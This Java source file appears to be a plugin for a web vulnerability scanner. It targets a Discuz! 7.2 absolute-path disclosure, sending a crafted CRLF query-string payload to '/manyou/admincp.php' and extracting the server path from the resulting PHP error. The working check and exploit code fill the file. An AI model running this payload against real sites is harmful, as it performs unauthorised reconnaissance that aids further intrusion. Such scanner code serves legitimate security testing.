package cn.com.nike.policy.policy;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

import cn.com.nike.policy.base.Policy;
import cn.com.nike.policy.base.PolicyInfo;
import cn.com.nike.policy.bean.ParameterConstant;
import cn.com.nike.policy.bean.WebVulnData;
import cn.com.nike.policy.util.PolicyUtil;

public class Discuz_72_Disclosure extends PolicyInfo implements Policy {

	private String url = "";

	public Discuz_72_Disclosure() {
		POLICYNAME = Discuz_72_Disclosure.class.getName();
		POLICYID = "SSV-ID: 87114";
		POLICYCOMPANY = "DISCUZ";
		POLICYTIME = "2014-07-07";
		POLICYDESCRIPTION = "Discuz绝对路径泄漏";
	}

	@Override
	public void setParameter(Map<String, Object> parameters) {
		url = parameters.get("url").toString();
		PAYLOAD_CHECK = "/manyou/admincp.php?my_suffix=%0A%0DTOBY57";
		PAYLOAD_EXPLOIT = "/manyou/admincp.php?my_suffix=%0A%0DTOBY57";
	}

	@Override
	public boolean check() throws IOException {
		CloseableHttpClient httpclient = HttpClients.createDefault();
		CloseableHttpResponse response = null;
		try {
			HttpGet httpget = new HttpGet(url + PAYLOAD_CHECK);
			response = httpclient.execute(httpget);
			HttpEntity entity = response.getEntity();
			int code = response.getStatusLine().getStatusCode();
			String content = EntityUtils.toString(entity);
			if (code == 200 && content.contains("Header may not contain")) {
				log.info("存在路径泄漏");
				return true;
			}

		} catch (Exception e) {
			log.error("检测异常", e);
		} finally {
			if (response != null)
				response.close();
			httpclient.close();
		}

		return false;
	}

	@Override
	public WebVulnData exploit() throws IOException {

		WebVulnData webVulnData = new WebVulnData();

		CloseableHttpClient httpclient = HttpClients.createDefault();
		CloseableHttpResponse response = null;
		try {
			HttpGet httpget = new HttpGet(url + PAYLOAD_EXPLOIT);
			response = httpclient.execute(httpget);
			HttpEntity entity = response.getEntity();
			int code = response.getStatusLine().getStatusCode();
			String content = EntityUtils.toString(entity);
			if (code == 200) {

				String info =  null;
				List<String> result = PolicyUtil.regex(" in <b>(.*?)</b> on", content, 1);
				
				if (result.size() == 1)
					info = result.get(0);
				else
					return webVulnData;

				Map<String, String> data = new HashMap<String, String>();
				data.put(ParameterConstant.ABSOLUTE_PATH, info);
				
				List<Map<String, String>> datas = new ArrayList<Map<String,String>>();
				datas.add(data);
				
				webVulnData.setResult(datas);
				log.info("绝对路径:"+info);
				
				return webVulnData;
			}

		} catch (Exception e) {
			log.error("利用异常", e);
		} finally {
			if (response != null)
				response.close();
			httpclient.close();
		}

		return webVulnData;
	}

	public static void main(String[] args) throws IOException {

		Map<String, Object> parameters = new HashMap<String, Object>();
		parameters.put("url", "http://127.0.0.1:81/discuz71");
		Discuz_72_Disclosure policy = new Discuz_72_Disclosure();
		policy.setParameter(parameters);
		if (policy.check())
			policy.exploit();

	}

}
